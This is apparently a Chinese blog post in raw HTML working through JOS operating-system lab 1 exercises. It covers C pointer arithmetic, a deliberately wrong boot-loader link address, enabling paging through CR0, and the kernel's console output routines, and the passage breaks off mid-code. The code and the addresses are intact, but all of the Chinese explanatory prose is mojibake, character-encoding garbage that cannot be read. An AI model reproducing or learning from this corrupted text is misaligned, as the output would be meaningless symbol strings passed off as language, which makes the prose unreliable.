ç†è§£åœ¨å±å¹•ä¸Šæ‰“å°å‡ºæ¥çš„æ‰€æœ‰çš„å€¼æ˜¯æ€ä¹ˆæ¥çš„ã€‚å°¤å…¶è¦é‡ç‚¹ç†è§£ç¬¬1è¡Œï¼Œç¬¬6è¡Œçš„æŒ‡é’ˆåœ°å€æ˜¯å¦‚ä½•å¾—åˆ°çš„ï¼Œä»¥åŠåœ¨ç¬¬2è¡Œåˆ°ç¬¬4è¡Œçš„å€¼æ˜¯å¦‚ä½•å¾—åˆ°çš„ï¼Œè¿˜æœ‰ä¸ºä»€ä¹ˆåœ¨ç¬¬5è¡Œæ‰“å°å‡ºæ¥çš„å€¼çœ‹èµ·æ¥åƒç¨‹åºå´©æºƒäº†ã€‚</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">f</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> a[<span class="hljs-number">4</span>];           <span class="hljs-comment">//intå‹æ•°ç»„</span><br>    <span class="hljs-type">int</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">16</span>);<span class="hljs-comment">//intç±»å‹æŒ‡é’ˆ</span><br>    <span class="hljs-type">int</span> *c;             <span class="hljs-comment">//intç±»å‹æŒ‡é’ˆ</span><br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1: a = %p, b = %p, c = %p\n&quot;</span>, a, b, c);<br>  <span class="hljs-comment">//aè¾“å‡ºaæ•°ç»„é¦–åœ°å€ï¼Œbè¾“å‡ºæ“ä½œç³»ç»Ÿåˆ†é…çš„å†…å­˜ç©ºé—´çš„èµ·å§‹åœ°å€ï¼Œcè¾“å‡ºæŒ‡é’ˆçš„å€¼ï¼Œæ­¤æ—¶æ˜¯æœªä¸€ä¸ªæœªå®šä¹‰çš„å€¼</span><br><br>    c = a;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>a[i] = <span class="hljs-number">100</span> + i; <span class="hljs-comment">//è¿è¡Œå®Œï¼Œaä¸­ä¸º100ï¼Œ101ï¼Œ102ï¼Œ103</span><br>    c[<span class="hljs-number">0</span>] = <span class="hljs-number">200</span>;       <span class="hljs-comment">//æ”¹a[0]ä¸º200</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;2: a[0] = %d, a[1] = %d, a[2] = %d, a[3] = %d\n&quot;</span>,<br>   a[<span class="hljs-number">0</span>], a[<span class="hljs-number">1</span>], a[<span class="hljs-number">2</span>], a[<span class="hljs-number">3</span>]);<br><br>    c[<span class="hljs-number">1</span>] = <span class="hljs-number">300</span>;<br>    *(c + <span class="hljs-number">2</span>) = <span class="hljs-number">301</span>;<br>    <span class="hljs-number">3</span>[c] = <span class="hljs-number">302</span>;      <span class="hljs-comment">//è®¿é—®æ•°ç»„çš„ä¸‰ç§ä¸åŒæ–¹æ³•ï¼Œä¿®æ”¹äº†aæ•°ç»„çš„å€¼</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;3: a[0] = %d, a[1] = %d, a[2] = %d, a[3] = %d\n&quot;</span>,<br>   a[<span class="hljs-number">0</span>], a[<span class="hljs-number">1</span>], a[<span class="hljs-number">2</span>], a[<span class="hljs-number">3</span>]);<br><br>    c = c + <span class="hljs-number">1</span>;      <span class="hljs-comment">//cæ­¤æ—¶æŒ‡å‘a[1]</span><br>    *c = <span class="hljs-number">400</span>;       <span class="hljs-comment">//ä¿®æ”¹a[1]ä¸º400</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;4: a[0] = %d, a[1] = %d, a[2] = %d, a[3] = %d\n&quot;</span>,<br>   a[<span class="hljs-number">0</span>], a[<span class="hljs-number">1</span>], a[<span class="hljs-number">2</span>], a[<span class="hljs-number">3</span>]);<br><br>    c = (<span class="hljs-type">int</span> *) ((<span class="hljs-type">char</span> *) c + <span class="hljs-number">1</span>);<br>    *c = <span class="hljs-number">500</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;5: a[0] = %d, a[1] = %d, a[2] = %d, a[3] = %d\n&quot;</span>,<br>   a[<span class="hljs-number">0</span>], a[<span class="hljs-number">1</span>], a[<span class="hljs-number">2</span>], a[<span class="hljs-number">3</span>]);<br><br>    b = (<span class="hljs-type">int</span> *) a + <span class="hljs-number">1</span>;<br>    c = (<span class="hljs-type">int</span> *) ((<span class="hljs-type">char</span> *) a + <span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;6: a = %p, b = %p, c = %p\n&quot;</span>, a, b, c);<br>&#125;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> ac, <span class="hljs-type">char</span> **av)</span><br>&#123;<br>    f();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2023/11/29/OSlab1/image-20231203150710971.png" alt="image-20231203150710971"></p><p>ç¬¬äº”æ¡ï¼Œå°†cå¼ºåˆ¶ç±»å‹è½¬æ¢æˆcharï¼Œæ­¤æ—¶ï¼Œcçš„å€¼ä¸º0x7ffd7b5c3474ï¼ŒåŠ 1åï¼Œä¸º0x7ffd7b5c3475ï¼Œå†è½¬æ¢æˆintï¼Œè¿™æ ·ä¼šåŒæ—¶å½±å“a[1], a[2]ï¼Œæ­¤æ—¶cæ“ä½œçš„åŒºåŸŸä¸º75-79</p><p><img src="/2023/11/29/OSlab1/image-20231203153045625.png" alt="image-20231203153045625"></p><p>æ‰€ä»¥a[1]å˜æˆ128144ï¼Œa[2]å˜æˆ256</p><p>ç¬¬å…­æ¡ï¼Œbå–açš„åœ°å€+1ï¼Œä½†æ­¤æ—¶bæ˜¯intç±»å‹æŒ‡é’ˆï¼Œæ‰€ä»¥å€¼å®é™…+4</p><p>cå°†aåœ°å€è½¬æ¢æˆcharç±»å‹ï¼Œå†+1ï¼Œå€¼ä¹Ÿ+1</p><h4 id="ç»ƒä¹ 5"><a href="#ç»ƒä¹ 5" class="headerlink" title="ç»ƒä¹ 5:"></a>ç»ƒä¹ 5:</h4><p><strong>å†æ¬¡è¿½è¸ªå¼•å¯¼åŠ è½½ç¨‹åºçš„å‰å‡ æ¡æŒ‡ä»¤ï¼Œæ‰¾å‡ºå¦‚æœå¼•å¯¼åŠ è½½ç¨‹åºçš„é“¾æ¥åœ°å€é”™è¯¯ï¼Œå°†ä¼šâ€œä¸­æ–­â€æˆ–æ‰§è¡Œé”™è¯¯çš„ç¬¬ä¸€æ¡æŒ‡ä»¤ã€‚ç„¶ååœ¨<code>boot/Makefrag</code>ä¸­å°†é“¾æ¥åœ°å€æ›´æ”¹ä¸ºé”™è¯¯çš„å€¼ï¼Œè¿è¡Œ<code>make clean</code>ï¼Œä½¿ç”¨<code>make</code>é‡æ–°ç¼–è¯‘å®éªŒï¼Œå†æ¬¡è¿½è¸ªå¼•å¯¼åŠ è½½ç¨‹åºï¼ŒæŸ¥çœ‹ä¼šå‘ç”Ÿä»€ä¹ˆã€‚ä¸è¦å¿˜è®°éšåå°†é“¾æ¥åœ°å€æ›´æ”¹å›æ­£ç¡®å€¼ï¼Œå¹¶å†æ¬¡è¿è¡Œ<code>make clean</code>ï¼</strong></p><p><strong>é“¾æ¥åœ°å€</strong></p><p>é“¾æ¥åœ°å€å¯ä»¥ç†è§£ä¸ºé€šè¿‡ç¼–è¯‘å™¨é“¾æ¥å™¨å¤„ç†å½¢æˆçš„å¯æ‰§è¡Œç¨‹åºä¸­æŒ‡ä»¤çš„åœ°å€ï¼Œå³é€»è¾‘åœ°å€</p><p><strong>åŠ è½½åœ°å€</strong></p><p>å¯æ‰§è¡Œæ–‡ä»¶çœŸæ­£è¢«è£…å…¥å†…å­˜åè¿è¡Œçš„åœ°å€ï¼Œå³ç‰©ç†åœ°å€ã€‚</p><p>åœ¨Labä¸­ä½œè€…è¯´ï¼ŒBIOSé»˜è®¤æŠŠboot loaderåŠ è½½åˆ°0x7C00å†…å­˜åœ°å€å¤„ï¼Œæ‰€ä»¥å°±è¦æ±‚boot loaderçš„é“¾æ¥åœ°å€ä¹Ÿè¦åœ¨0x7C00å¤„ã€‚boot loaderåœ°å€çš„è®¾å®šæ˜¯åœ¨boot&#x2F;Makefragä¸­å®Œæˆçš„ï¼Œæ‰€ä»¥ä¿®æ”¹è¿™ä¸ªå€¼åº”è¯¥å°±æ˜¯é¢˜ç›®æ‰€è¦æ±‚çš„</p><p>æ ¹æ®é¢˜ç›®è¦æ±‚ï¼Œæ‰¾åˆ°Makefragä¸­çš„é“¾æ¥ä½ç½®ï¼Œè¿™é‡Œå°†0x7c00ä¿®æ”¹æˆ0x7e00ï¼Œé‡æ–°æ‰§è¡Œmake</p><p><img src="/2023/11/29/OSlab1/image-20231203155358101.png" alt="image-20231203155358101"></p><p>ä¸‹å›¾è¿™æ¡æŒ‡ä»¤æ˜¯æŠŠæŒ‡ä»¤åé¢çš„å€¼æ‰€æŒ‡å®šå†…å­˜åœ°å€å¤„å6ä¸ªå­—èŠ‚çš„å€¼è¾“å…¥å…¨å±€æè¿°ç¬¦è¡¨å¯„å­˜å™¨GDTRï¼Œä½†æ˜¯å½“å‰è¿™æ¡æŒ‡ä»¤è¯»å–çš„å†…å­˜åœ°å€æ˜¯0x7e64ï¼Œè¿™é‡Œå­˜å…¥çš„å…¨éƒ¨æ˜¯0ï¼Œå°±å¯¼è‡´äº†GDTè¡¨è¯»å–çš„å€¼ä¸æ­£ç¡®ï¼Œå¦‚æœè¦è¿›å…¥ä¿æŠ¤æ¨¡å¼ï¼Œå°±å¿…é¡»è¦å…ˆå¯åŠ¨åˆ†æ®µæœºåˆ¶ï¼Œå¦‚æœå…¨å±€æè¿°ç¬¦è¡¨è¯»å–ä¸æ­£ç¡®ï¼Œæ®µçš„ä¿¡æ¯ä¹Ÿä¸æ­£ç¡®ï¼Œè‡ªç„¶æ— æ³•æˆåŠŸå¯åŠ¨</p><p><img src="/2023/11/29/OSlab1/image-20231203162346709.png" alt="image-20231203162346709"></p><p>ç»§ç»­æ‰§è¡Œï¼Œè¿è¡Œåˆ°è¿™é‡Œä¹‹åå°±å‡ºé”™äº†ï¼Œå› ä¸ºå®é™…è¦è·³è½¬å»çš„ä½ç½®æ˜¯0x7c32</p><p><img src="/2023/11/29/OSlab1/image-20231203163201635.png" alt="image-20231203163201635"></p><h4 id="ç»ƒä¹ 6"><a href="#ç»ƒä¹ 6" class="headerlink" title="ç»ƒä¹ 6"></a>ç»ƒä¹ 6</h4><p><strong>åœ¨BIOSè¿›å…¥Boot loaderæ—¶æ£€æŸ¥åœ¨0x00100000å¤„çš„8ä¸ªå­—ï¼Œç„¶ååœ¨å¼•å¯¼åŠ è½½ç¨‹åºè¿›å…¥å†…æ ¸æ—¶å†æ¬¡æ£€æŸ¥ã€‚ ä»–ä»¬ä¸ºä»€ä¹ˆä¸åŒï¼Ÿ</strong> </p><p>ç­”ï¼šåœ¨BIOSè¿›å…¥Boot loaderæ—¶ï¼Œ0x100000å†…å­˜åçš„8ä¸ªå­—éƒ½ä¸ºé›¶ï¼Œå› ä¸ºæ­¤æ—¶å†…æ ¸ç¨‹åºè¿˜æ²¡æœ‰åŠ è½½è¿›å…¥å†…å­˜ã€‚ å†…æ ¸çš„åŠ è½½åœ¨<code>bootmain</code>å‡½æ•°ä¸­å®Œæˆã€‚</p><p><img src="/2023/11/29/OSlab1/image-20231207173300436.png" alt="image-20231207173300436"></p><p><img src="/2023/11/29/OSlab1/image-20231207173652370.png" alt="image-20231207173652370"></p><h3 id="ç¬¬ä¸‰éƒ¨åˆ†ï¼šLoading-the-Kernel"><a href="#ç¬¬ä¸‰éƒ¨åˆ†ï¼šLoading-the-Kernel" class="headerlink" title="ç¬¬ä¸‰éƒ¨åˆ†ï¼šLoading the Kernel"></a>ç¬¬ä¸‰éƒ¨åˆ†ï¼šLoading the Kernel</h3><h4 id="ç»ƒä¹ 7"><a href="#ç»ƒä¹ 7" class="headerlink" title="ç»ƒä¹ 7"></a>ç»ƒä¹ 7</h4><p>ä½¿ç”¨QEMUå’ŒGDBæ¥è·Ÿè¸ªè¿›å…¥JOSå†…æ ¸å¹¶åœ¨movl %eax, %cr0å¤„åœä¸‹æ¥ã€‚æ£€æŸ¥åœ°å€0x00100000å’Œ0xf0100000çš„å†…å­˜ã€‚ç°åœ¨ï¼Œä½¿ç”¨GDBå‘½ä»¤stepiå•æ­¥æ‰§è¡Œè¯¥æŒ‡ä»¤ã€‚å†æ¬¡æ£€æŸ¥åœ°å€0x00100000å’Œ0xf0100000çš„å†…å­˜ã€‚ç¡®ä¿ä½ ç†è§£åˆšåˆšå‘ç”Ÿçš„äº‹æƒ…ã€‚</p><p>åœ¨æ–°æ˜ å°„å»ºç«‹åï¼Œå¦‚æœæ˜ å°„æ²¡æœ‰ç”Ÿæ•ˆï¼Œä¼šå¯¼è‡´æ— æ³•æ­£å¸¸å·¥ä½œçš„ç¬¬ä¸€æ¡æŒ‡ä»¤æ˜¯ä»€ä¹ˆï¼Ÿå°†kern&#x2F;entry.Sä¸­çš„movl %eax, %cr0æ³¨é‡Šæ‰ï¼Œè¿›è¡Œè·Ÿè¸ªï¼Œçœ‹çœ‹ä½ æ˜¯å¦æ­£ç¡®ã€‚</p><p>æ“ä½œç³»ç»Ÿå†…æ ¸é€šå¸¸è¢«é“¾æ¥åˆ°éå¸¸é«˜çš„è™šæ‹Ÿåœ°å€ï¼ˆä¾‹å¦‚0xf0100000ï¼‰ä¸‹è¿è¡Œï¼Œä»¥ä¾¿ç•™ä¸‹å¤„ç†å™¨è™šæ‹Ÿåœ°å€ç©ºé—´çš„ä½åœ°å€éƒ¨åˆ†ä¾›ç”¨æˆ·ç¨‹åºä½¿ç”¨ã€‚</p><p>è®¸å¤šæœºå™¨åœ¨åœ°å€èŒƒå›´æ— æ³•è¾¾åˆ°<code>0xf0100000</code>ï¼Œå› æ­¤æˆ‘ä»¬æ— æ³•æŒ‡æœ›èƒ½å¤Ÿåœ¨é‚£é‡Œå­˜å‚¨å†…æ ¸ã€‚ç›¸åï¼Œæˆ‘ä»¬å°†ä½¿ç”¨å¤„ç†å™¨çš„å†…å­˜ç®¡ç†ç¡¬ä»¶å°†è™šæ‹Ÿåœ°å€<code>0xf0100000</code>ï¼ˆå†…æ ¸ä»£ç æœŸæœ›è¿è¡Œçš„é“¾æ¥åœ°å€ï¼‰æ˜ å°„åˆ°ç‰©ç†åœ°å€<code>0x00100000</code>ï¼ˆå¼•å¯¼åŠ è½½ç¨‹åºå°†å†…æ ¸åŠ è½½åˆ°ç‰©ç†å†…å­˜ä¸­ï¼‰ã€‚</p><p>ç°åœ¨ï¼Œæˆ‘ä»¬åªéœ€æ˜ å°„å‰4MBçš„ç‰©ç†å†…å­˜ï¼Œè¿™è¶³ä»¥è®©æˆ‘ä»¬å¯åŠ¨å¹¶è¿è¡Œã€‚ æˆ‘ä»¬ä½¿ç”¨<code>kern/entrypgdir.c</code>ä¸­æ‰‹å†™çš„ï¼Œé™æ€åˆå§‹åŒ–çš„é¡µé¢ç›®å½•å’Œé¡µè¡¨æ¥å®Œæˆæ­¤æ“ä½œã€‚</p><p>ä¸ºäº†å®ç°è™šæ‹Ÿåœ°å€ï¼Œéœ€è¦é€šè¿‡CR0ï¼Œè¿™ä¸ªå¯„å­˜å™¨çš„ç¬¬31ä½æ˜¯åˆ†é¡µæ ‡å¿—</p><p><img src="/2023/11/29/OSlab1/image-20231203203708983.png" alt="image-20231203203708983"></p><p>æ˜¾ç„¶åœ¨æ‰§è¡Œå®Œmov %eaxï¼Œ%cr0åï¼Œåœ°å€æ˜ å°„æˆåŠŸäº†</p><p><img src="/2023/11/29/OSlab1/image-20231203204834851.png" alt="image-20231203204834851"></p><p>çŒœæµ‹ä¼šå‡ºé”™çš„æ˜¯mov $relocated, %eaxï¼Œrelocatedè¿™ä¸ªçš„åœ°å€æ˜¯æ®µåœ°å€+åç§»åœ°å€å¾—åˆ°çš„ï¼Œå¦‚æœæ˜ å°„å¤±è´¥ï¼Œé‚£ä¹ˆæ®µåœ°å€å°†è¿˜æ˜¯åœ¨é«˜åœ°å€ï¼Œè®¡ç®—åï¼Œåº”è¯¥ä¼šå¯¼è‡´è¶Šç•Œé”™è¯¯ï¼Œé€šè¿‡gdbéªŒè¯ï¼š</p><p><img src="/2023/11/29/OSlab1/image-20231203205746371.png" alt="image-20231203205746371"></p><p>æ³¨é‡Šäº†ä¹‹åï¼Œå‘ç°åœ°å€æ˜ å°„ç¡®å®å¤±è´¥ï¼Œç»§ç»­è¿è¡Œï¼Œåˆ°mov $relocated, %eaxæ—¶ï¼Œqemuä¹Ÿæ‰“å°å‡ºäº†é”™è¯¯ç»ˆæ­¢è¿è¡Œã€‚</p><h4 id="ç»ƒä¹ 8"><a href="#ç»ƒä¹ 8" class="headerlink" title="ç»ƒä¹ 8"></a>ç»ƒä¹ 8</h4><p><strong>æˆ‘ä»¬çœç•¥äº†ä¸€å°æ®µä»£ç  - ä½¿ç”¨â€œ%oâ€å½¢å¼çš„æ¨¡å¼æ‰“å°å…«è¿›åˆ¶æ•°æ‰€éœ€çš„ä»£ç ã€‚æ‰¾åˆ°å¹¶å¡«å†™æ­¤ä»£ç ç‰‡æ®µã€‚</strong></p><p>é¢˜ç›®è¦æ±‚æˆ‘ä»¬é˜…è¯»ä¸‰ä¸ªæºæ–‡ä»¶ï¼ˆ\kern\printf.c , \kern\console.c , \lib\printfmt.cï¼‰çš„ä»£ç ï¼Œå¹¶å¼„æ¸…æ¥šä»–ä»¬çš„å…³ç³»</p><ul><li><strong>\kern\printf.c</strong>ä¸­çš„cprintfï¼Œvcprintfå­ç¨‹åºè°ƒç”¨äº†<strong>\lib\printfmt.c</strong>ä¸­çš„<strong>vprintfmt</strong>å­ç¨‹åºã€‚</li><li><strong>\kern\printf.c</strong>ä¸­çš„putchå­ç¨‹åºä¸­è°ƒç”¨äº†<strong>cputchar</strong>ï¼Œè¿™ä¸ªç¨‹åºæ˜¯å®šä¹‰åœ¨<strong>\kern\console.c</strong>ä¸­çš„ã€‚</li><li><strong>\lib\printfmt.c</strong>ä¸­çš„ä¸€äº›åŠŸèƒ½ä¹Ÿä¾èµ–äº<strong>cputchar</strong>å­ç¨‹åº</li></ul><p>æ‰€ä»¥å¾—å‡ºç»“è®ºï¼Œ<strong>\kern\printf.c</strong>ï¼Œ<strong>\lib\printfmt.c</strong>ä¸¤ä¸ªæ–‡ä»¶çš„åŠŸèƒ½ä¾èµ–äº<strong>\kern\console.c</strong>çš„åŠŸèƒ½ã€‚æ‰€ä»¥æˆ‘ä»¬å°±çœ‹ä¸€ä¸‹<strong>\kern\console.c</strong>ã€‚</p><p><strong>\kern\console.c</strong>ï¼š</p><p>ä»£ç è¾ƒé•¿ï¼Œå…³æ³¨è¾ƒä¸ºé‡è¦çš„cputchar</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// `High&#x27;-level console I/O.  Used by readline and cprintf.</span><br><span class="hljs-type">void</span><br><span class="hljs-title function_">cputchar</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span><br>&#123;<br>    cons_putc(c);<br>&#125;<br><br><span class="hljs-comment">// output a character to the console</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">cons_putc</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span><br>&#123;<br>    serial_putc(c);<br>    lpt_putc(c);<br>    cga_putc(c);<br>&#125;<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆå†çœ‹serial_putc(c)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> COM1        0x3F8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COM_TX        0    <span class="hljs-comment">// Out: Transmit buffer (DLAB=0)</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COM_LSR        5    <span class="hljs-comment">// In:    Line Status Register</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COM_LSR_TXRDY    0x20    <span class="hljs-comment">//   Transmit buffer avail å…·ä½“å«ä¹‰/å…¨ç¨‹</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">serial_putc</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>;<br>         !(inb(COM1 + COM_LSR) &amp; COM_LSR_TXRDY) &amp;&amp; i &lt; <span class="hljs-number">12800</span>;<br>         i++)<br>        delay();<br><br>    outb(COM1 + COM_TX, c);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™æ®µä»£ç å®é™…ä¸Šæ˜¯æ§åˆ¶0x3F8+5 &#x3D; 0x3FDï¼Œ 0x3F8+0 &#x3D; 0x3F8è¿™ä¸¤ä¸ªç«¯å£</p><p>é€šè¿‡æŸ¥è¯¢ç«¯å£åŠŸèƒ½ï¼Œå¯ä»¥çŸ¥é“ï¼šinbæŒ‡ä»¤æ˜¯è¯»å–0x3fdç«¯å£çš„å†…å®¹ï¼Œå¹¶ä¸”åˆ¤æ–­å®ƒçš„bit5æ˜¯å¦ä¸º1ï¼Œå³å‘é€æ•°æ®ç¼“å†²å¯„å­˜å™¨æ˜¯å¦ä¸ºç©ºã€‚å¦‚æœä¸ºç©ºï¼Œåˆ™è®¡ç®—æœºå¯ä»¥å‘é€ä¸‹ä¸€ä¸ªæ•°æ®ç»™ç«¯å£ã€‚</p><p>è€ŒoutbæŒ‡ä»¤åˆ™æ˜¯æŠŠè¦å‘é€çš„æ•°æ®cï¼Œå‘é€ç»™0x3f8ï¼Œä»ä¸Šå›¾ä¸­å¯è§ï¼Œå½“0x3f8ç«¯å£è¢«å†™å…¥å€¼æ—¶ï¼Œä»–æ˜¯ä½œä¸ºå‘é€æ•°æ®ç¼“å†²å¯„å­˜å™¨çš„ï¼Œé‡Œé¢å­˜æ”¾è¦å‘é€ç»™ä¸²å£çš„æ•°æ®ã€‚</p><p>lpt_putc:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/***** Parallel port output code *****/</span><br><span class="hljs-comment">// For information on PC parallel port programming, see the class References</span><br><span class="hljs-comment">// page.</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">lpt_putc</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; !(inb(<span class="hljs-number">0x378</span>+<span class="hljs-number">1</span>) &amp; <span class="hljs-number">0x80</span>) &amp;&amp; i &lt; <span class="hljs-number">12800</span>; i++)<br>        delay();<br>    outb(<span class="hljs-number">0x378</span>+<span class="hljs-number">0</span>, c);<br>    outb(<span class="hljs-number">0x378</span>+<span class="hljs-number">2</span>, <span class="hljs-number">0x08</span>|<span class="hljs-number">0x04</span>|<span class="hljs-number">0x01</span>);<br>    outb(<span class="hljs-number">0x378</span>+<span class="hljs-number">2</span>, <span class="hljs-number">0x08</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>åŸç†ä¸Šä¹Ÿæ˜¯åœ¨æ“ä½œIOç«¯å£ï¼Œç»è¿‡æŸ¥è¯¢ï¼Œè¿™æ®µä»£ç ç”¨äºå‘PCå¹¶è¡Œç«¯å£å‘é€å­—ç¬¦ï¼Œå¹¶é€šè¿‡è½®è¯¢çš„æ–¹å¼ç­‰å¾…ç«¯å£å‡†å¤‡å¥½æ¥æ”¶æ•°æ®ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">cga_putc</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span><br>&#123;<br>    <span class="hljs-comment">// if no attribute given, then use black on white</span><br>    <span class="hljs-keyword">if</span> (!(c &amp; ~<span class="hljs-number">0xFF</span>))<br>        c |= <span class="hljs-number">0x0700</span>;<br><br>    <span class="hljs-keyword">switch</span> (c &amp; <span class="hljs-number">0xff</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\b&#x27;</span>: <span class="hljs-comment">//é€€æ ¼</span><br>        <span class="hljs-keyword">if</span> (crt_pos &gt; <span class="hljs-number">0</span>) &#123;<br>            crt_pos--;<br>            crt_buf[crt_pos] = (c &amp; ~<span class="hljs-number">0xff</span>) | <span class="hljs-string">&#x27; &#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\n&#x27;</span>:  <span class="hljs-comment">//æ¢è¡Œ</span><br>        crt_pos += CRT_COLS;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\r&#x27;</span>:  <span class="hljs-comment">//å›è½¦ç¬¦ï¼Œå°†å…‰æ ‡ç§»åŠ¨åˆ°å½“å‰è¡Œå¼€å¤´</span><br>        crt_pos -= (crt_pos % CRT_COLS);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\t&#x27;</span>:  <span class="hljs-comment">//åˆ¶è¡¨</span><br>        cons_putc(<span class="hljs-string">&#x27; &#x27;</span>);<br>        cons_putc(<span class="hljs-string">&#x27; &#x27;</span>);<br>        cons_putc(<span class="hljs-string">&#x27; &#x27;</span>);<br>        cons_putc(<span class="hljs-string">&#x27; &#x27;</span>);<br>        cons_putc(<span class="hljs-string">&#x27; &#x27;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:    <span class="hljs-comment">//æ™®é€šå­—ç¬¦</span><br>        crt_buf[crt_pos++] = c;        <span class="hljs-comment">/* write the character */</span><br>        <span 